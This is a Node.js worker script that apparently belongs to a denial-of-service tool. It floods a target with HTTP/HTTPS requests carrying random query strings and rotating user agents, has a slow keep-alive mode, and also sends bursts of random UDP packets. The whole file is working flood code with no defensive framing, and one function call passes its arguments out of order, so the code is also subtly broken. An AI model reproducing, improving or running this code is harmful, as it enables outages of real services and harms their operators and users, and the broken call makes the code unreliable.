// File: worker.js
const { parentPort, workerData } = require('worker_threads');
const net = require('net');
const tls = require('tls'); 
const crypto = require('crypto');
const dgram = require('dgram'); 
const path = require('path'); 

const { targetIP, port, attackType, mode, durationMs, httpMethod, workerId, USER_AGENTS, CHARSET } = workerData;

let sentRequests = 0;
let activeConnections = 0; 
let errors = 0;
let serverErrors = 0;
let durationTimer = null; 
let isStopping = false; 
let socket = null; // Socket TCP/TLS

// --- Helper Functions ---
const LOCAL_USER_AGENTS = USER_AGENTS || [ "HydraWorkerClient" ];
const LOCAL_CHARSET = CHARSET || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

function getRandomBigInt(max) {
    try {
        const buffer = crypto.randomBytes(Math.ceil(Math.log2(max) / 8));
        const num = buffer.readUIntBE(0, buffer.length);
        return num % max;
    } catch (e) { return Math.floor(Math.random() * max); }
}

function generateRandomString(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += LOCAL_CHARSET[getRandomBigInt(LOCAL_CHARSET.length)];
    }
    return result;
}

function getRandomUserAgent() {
    if (LOCAL_USER_AGENTS.length === 0) return 'HydraWorkerClient';
    return LOCAL_USER_AGENTS[getRandomBigInt(LOCAL_USER_AGENTS.length)];
}

function parseHTTPStatus(responseData) {
    if (!responseData || responseData.length === 0) return ["", "No Response Data"];
    const responseStr = responseData.toString();
    if (responseStr.includes("HTTP/")) {
        const lines = responseStr.split('\r\n');
        if (lines.length > 0) {
            const statusLine = lines[0];
            const parts = statusLine.split(' ');
            if (parts.length >= 2) return [parts[1], statusLine];
        }
    }
    return ["", "Non-HTTP Response"];
}

// --- Logika Serangan HTTP ---
async function httpAttack(target, method, mode) {
    const requestQueue = [];
    let lastWriteTime = Date.now(); 

    for (let i = 0; i < 100; i++) { requestQueue.push(generateRandomString(10)); }

    if (durationMs !== null) {
        durationTimer = setTimeout(() => {
            isStopping = true; 
            if (socket && !socket.destroyed) socket.end(); 
        }, durationMs);
    }

    const attackLoop = async () => {
        if (isStopping || !socket || socket.destroyed) {
            return;
        }

        let requestIdentifier = requestQueue.shift() || generateRandomString(10); 
        let request = `${method} /?${requestIdentifier} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${getRandomUserAgent()}\r\nConnection: keep-alive\r\n`;

        if (mode === 'slow') {
             request = `${method} /?${requestIdentifier} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${getRandomUserAgent()}\r\nAccept: */*\r\nAccept-Encoding: identity\r\nConnection: keep-alive\r\n`;
        }

        try {
            socket.write(request);
            sentRequests++;
            activeConnections = 1; 
            lastWriteTime = Date.now();

            socket.once('data', (data) => {
                const [status, _] = parseHTTPStatus(data);
                if (status && (status.startsWith('4') || status.startsWith('5'))) {
                    serverErrors++;
                    parentPort.postMessage({ type: 'stats', serverErrors: 1 });
                }
                if (mode === 'normal') {
                    if (socket && !socket.destroyed) socket.end(); 
                }
            });

            requestQueue.push(generateRandomString(10)); 

            if (sentRequests % 50 === 0) {
                parentPort.postMessage({ type: 'stats', sent: 50, active: activeConnections, errors: 0, serverErrors: 0 });
            }

        } catch (error) {
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            if (socket && !socket.destroyed) socket.end(); 
        }
        
        // Jadwalkan loop berikutnya
        setTimeout(attackLoop, 1 + Math.floor(Math.random() * 4));
    };

    attackLoop(); // Mulai loop serangan
}

// Logika Serangan UDP (Placeholder)
async function udpAttack(udpSocket, target, port) {
    const startTime = Date.now();
    while (!isStopping) { 
        if (durationMs !== null && (Date.now() - startTime > durationMs)) break;

        try {
            const payload = Buffer.from(generateRandomString(500 + Math.floor(Math.random() * 500)));
            udpSocket.send(payload, port, target);
            sentRequests++;
            activeConnections = 1;
            parentPort.postMessage({ type: 'stats', sent: 1, active: activeConnections });
            await new Promise(res => setTimeout(res, 10)); 
        } catch (error) {
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            break; 
        }
    }
}

// --- Fungsi Utama Worker ---
async function runWorker() {
    let isConnectionSuccessful = false;

    parentPort.on('message', (message) => {
        if (message.type === 'stop') {
            isStopping = true;
            clearTimeout(durationTimer); 
            if (socket && !socket.destroyed) {
                socket.end(); 
            }
        }
    });

    try {
        if (port === 443 || attackType.toLowerCase() === 'https') {
            const options = { host: targetIP, port: port, timeout: 5000 };
            socket = tls.connect(options);
        } else if (attackType === 'http') {
            const options = { host: targetIP, port: port, timeout: 5000 };
            socket = net.connect(options);
        } else if (attackType === 'udp') {
            const udpSocket = dgram.createSocket('udp4');
            socket = udpSocket; 

            udpSocket.on('error', (err) => {
                errors++;
                parentPort.postMessage({ type: 'stats', errors: 1 });
                udpSocket.close();
                isStopping = true; 
            });

            udpSocket.on('message', (msg, rinfo) => { 
                serverErrors++;
                parentPort.postMessage({ type: 'stats', serverErrors: 1 });
            });

            activeConnections = 1; 
            parentPort.postMessage({ type: 'stats', active: activeConnections });
            await udpAttack(udpSocket, targetIP, port); 
            udpSocket.close();
            return; 
        } else {
            throw new Error(`Unsupported attack type: ${attackType}`);
        }

        // Handler untuk koneksi TCP/TLS
        socket.on('connect', () => {
            isConnectionSuccessful = true;
            activeConnections = 1;
            parentPort.postMessage({ type: 'stats', active: activeConnections });
            httpAttack(socket, targetIP, httpMethod, mode);
        });

        socket.on('timeout', () => { // Timeout koneksi
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            if (socket && !socket.destroyed) socket.end(); 
        });

        socket.on('close', (hadError) => {
            activeConnections = 0;
            parentPort.postMessage({ type: 'stats', active: activeConnections });
            clearTimeout(durationTimer); 
            isStopping = true; 
        });

        socket.on('error', (err) => {
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            if (socket && !socket.destroyed) socket.end(); 
            isStopping = true; 
        });

    } catch (error) {
        errors++;
        parentPort.postMessage({ type: 'stats', errors: 1 });
        console.error(`Worker ${workerId}: Global error in worker:`, error.message);
        isStopping = true; 
    } finally {
        // Pastikan pesan 'done' dikirim dan socket ditutup
        if (!isStopping || (socket && socket.destroyed)) { 
             parentPort.postMessage({ type: 'done', workerId: workerId });
        }
        if (socket && !socket.destroyed) socket.end(); 
        clearTimeout(durationTimer); 
    }
}

runWorker();
